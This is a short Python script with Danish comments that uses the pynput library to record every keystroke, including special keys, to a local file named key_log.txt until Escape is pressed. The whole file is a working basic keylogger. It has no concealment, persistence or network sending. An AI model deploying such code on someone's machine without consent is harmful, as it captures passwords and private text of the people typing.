from pynput import keyboard

# Angiv stien til logfilen
log_file = "key_log.txt"

# Definer en mapping for specialtaster til læsbare strenge
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_gr: "[ALT_GR]",
    keyboard.Key.caps_lock: "[CAPS_LOCK]",
    # Tilføj andre specialtaster hvis nødvendigt
}

# Et sæt til at holde styr på aktuelt trykkede taster
pressed_keys = set()

# Funktion til at håndtere tastetryk begivenheder
def on_press(key):
    pressed_keys.add(key)  # Tilføj den trykkede tast til sættet af trykkede taster
    try:
        with open(log_file, "a") as file:  # Åbn logfilen i tilføj tilstand
            if hasattr(key, 'char') and key.char is not None:  # Tjek om tasten har en 'char' attribut og den ikke er None
                file.write(key.char)  # Skriv tegnet til logfilen
            else:
                # Skriv den læsbare streng for specialtaster til logfilen
                file.write(special_keys.get(key, f"[{key}]"))
    except AttributeError:
        with open(log_file, "a") as file:  # Åbn logfilen i tilføj tilstand
            file.write(special_keys.get(key, f"[{key}]"))  # Skriv den læsbare streng for specialtaster til logfilen

# Funktion til at håndtere tastefrigivelses begivenheder
def on_release(key):
    pressed_keys.discard(key)  # Fjern den frigivne tast fra sættet af trykkede taster
    if key == keyboard.Key.esc:  # Tjek om den frigivne tast er escape tasten
        # Stop lytteren
        return False

# Saml begivenheder indtil de frigives
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:  # Opsæt lytteren for tastatur begivenheder
    listener.join()  # Start lytteren og hold den kørende indtil den stoppes
